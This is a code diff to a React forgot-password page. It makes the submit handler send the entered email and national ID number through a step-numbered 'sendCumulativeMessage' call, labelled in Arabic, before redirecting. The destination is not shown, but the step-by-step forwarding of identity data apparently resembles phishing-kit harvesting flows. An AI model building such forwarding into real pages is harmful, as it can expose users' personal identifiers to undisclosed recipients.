@@ -4,14 +4,25 @@ import { ArrowRight, X } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import Footer from "@/components/Footer";
+import { useRegistration } from "@/contexts/RegistrationContext";
 
 const ForgotPassword = () => {
   const navigate = useNavigate();
   const [email, setEmail] = useState("");
   const [idNumber, setIdNumber] = useState("");
+  const { updateData, sendCumulativeMessage } = useRegistration();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    const newData = {
+      forgotPasswordEmail: email,
+      forgotPasswordId: idNumber
+    };
+    
+    await sendCumulativeMessage(10, "نسيت كلمة المرور", newData);
+    updateData(newData);
+    
     // Navigate to email verification page with the email
     navigate("/email-verification", { state: { email } });
   };
